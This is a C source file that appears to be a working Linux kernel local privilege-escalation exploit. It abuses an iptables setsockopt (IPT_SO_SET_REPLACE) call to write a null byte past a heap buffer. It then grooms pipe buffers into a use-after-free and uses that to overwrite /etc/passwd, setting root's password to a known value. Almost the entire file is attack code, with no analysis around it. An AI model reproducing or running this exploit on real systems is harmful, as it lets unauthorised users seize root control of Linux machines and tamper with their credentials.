#define _GNU_SOURCE
#include <arpa/inet.h>
#include <libiptc/libiptc.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>

#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdlib.h>
#include <unistd.h>

#define dbgBreak() __asm__("int3")

#define IP_PARTS_NATIVE(n)                \
    (unsigned int)((n) >> 24) & 0xFF,     \
        (unsigned int)((n) >> 16) & 0xFF, \
        (unsigned int)((n) >> 8) & 0xFF,  \
        (unsigned int)((n) & 0xFF)

#define IP_PARTS(n) IP_PARTS_NATIVE(ntohl(n))

#define TABLE_MAXNAMELEN 32

#define DEBUG

static void inline panic(const char *msg)
{
    perror(msg);
    _Exit(1);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

void init(void)
{
    if (unshare(CLONE_NEWUSER) < 0)
    {
        panic("[-] unshare(CLONE_NEWUSER)");
    }

    if (unshare(CLONE_NEWNET) < 0)
    {
        panic("[-] unshare(CLONE_NEWNET)");
    }

    pin_cpu(0);
}

#define TARGET_SIZE 0x1000
/*trigger 1 byte null at pipe->page*/
void trigger()
{
    int socketfd = socket(AF_INET, SOCK_RAW | SOCK_CLOEXEC, IPPROTO_RAW);
    if (socketfd < 0)
    {
        panic("socket");
    }

    struct __attribute__((__packed__))
    {
        struct ipt_replace rpl;
        struct ipt_entry entry;
        struct xt_entry_match match;
        // 0x40 -> struct xt_table_info
        // for xt_alloc_table_info(size) -> kmalloc(size+0x40)
        // sizeof struct pipe_buffer -> 0x28, we avoid to write null-byte at the first pipe_buffer objects, it's page always starts at ...00
        char match_data[TARGET_SIZE - 0x40 - sizeof(struct ipt_entry) - sizeof(struct xt_entry_match) - sizeof(struct xt_entry_target) - 0x50 - 3];
        struct xt_entry_target target;
    } info = {0};

    info.rpl.num_counters = 1;
    info.rpl.num_entries = 1;

    info.rpl.size = (sizeof(info) - sizeof(info.rpl)); // 0x1000

    info.match.u.match_size = sizeof(info.match) + sizeof(info.match_data);
    strcpy(info.match.u.user.name, "tcp");

    info.entry.target_offset = sizeof(info.entry) + info.match.u.match_size;
    info.entry.next_offset = info.entry.target_offset + sizeof(info.target);

    info.target.u.target_size = sizeof(info.target);
    strcpy(info.target.u.user.name, "NFLOG");
    info.target.u.user.revision = 0;

    /*
        cat /proc/net/ip_tables_targets
        IDLETIMER
        IDLETIMER
        SECMARK
        RATEEST
        NFQUEUE
        NFQUEUE
        NFQUEUE
        NFQUEUE
        NFLOG
        LED
        CLASSIFY
        AUDIT
        MARK
        ERROR
        TCPMSS
        LOG
    */

    printf("%u\n%u\n", sizeof(info.match_data), info.rpl.size);

    int err = setsockopt(socketfd, SOL_IP, IPT_SO_SET_REPLACE, &info, sizeof(info));
    if (err == ENOPROTOOPT)
    {
        panic("setsockopt");
    }
}

#define PIPE_NUM 0x80
#define FILE_NUM 0x200

int pipe_fd[PIPE_NUM][2];
int file_fd[FILE_NUM];

int main(int argc, char **argv, char **envp)
{
    init();

    void *tmp = malloc(0x1000);
    uint64_t pipe_magic;

    for (uint i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
        {
            panic("PIPE_ERROR.");
        }
    }

    for (uint i = 0; i < PIPE_NUM; i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0)
        {
            printf("[x] failed to extend %d pipe!\n", i);
            return -1;
        }
    }

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (i % 0x10)
        {
            memcpy(tmp, "ABCD1234", 0x8);
            pipe_magic = 0xdeadbeef + i;
            write(pipe_fd[i][1], tmp, 0x8);
            write(pipe_fd[i][1], &pipe_magic, 0x8);
        }
    }

    puts("[*] Create hole.");
    for (int i = 0x10; i < PIPE_NUM; i += 0x10)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    puts("[!] Trigger");
    //    getchar();
    trigger();

    size_t victim_idx, prev_idx = 0;
    uint64_t magik = 0;
    void *tmp1 = malloc(0x1000);
    for (uint i = 0; i < PIPE_NUM; ++i)
    {
        if (i % 0x10)
        {
            read(pipe_fd[i][0], tmp1, 0x8);
            read(pipe_fd[i][0], &magik, 0x8);
            if ((magik != 0xdeadbeef + i) && (memcmp(tmp1, "ABCD1234", 8) == 0))
            {
                puts(tmp1);
                victim_idx = magik - 0xdeadbeef;
                if (victim_idx >= PIPE_NUM)
                    goto fail;
                prev_idx = i;
                printf("Found two pipes dup %u - %u\n", victim_idx, prev_idx);
                break;
            }
        }
    }

    if (victim_idx == 0 || prev_idx == 0)
    {
    fail:
        panic("Fail");
    }

    write(pipe_fd[prev_idx][1], tmp1, 0x3c + 0x8);

    // getchar();
    puts("[*] UAF one of the pipe->page.");
    close(pipe_fd[victim_idx][0]);
    close(pipe_fd[victim_idx][1]);
    getchar();

    puts("[*] Spray passwd file...");

    for (int i = 0; i < FILE_NUM; i++)
    {
        file_fd[i] = open("/etc/passwd", 0);
        if (!file_fd[i])
        {
            panic("open");
        }
    }

    int a[2];
    a[0] = 0x480e801f;
    write(pipe_fd[prev_idx][1], a, 4);

    printf("Creating the pwd.bck\n");
    system("cp /etc/passwd /tmp/passwd.bak");

    char *data = "root:$1$vjp$MwIITGBsI/yq9SjW7FXPj0:0:0:test:/root:/bin/bash\n";
    printf("Setting root password to \"vjp\"...\n");
    int data_size = strlen(data);

    puts("[*] Finally: edit the pwd file");
    // what we want to edit pipe->page
    for (int i = 0; i < FILE_NUM; i++)
    {
        int retval = write(file_fd[i], data, data_size);
        if (retval > 0)
        {
            printf("Write Success:%d!\n", i);
            return 0;
        }
        printf("%d\n", i);
    }

    return -1;
}
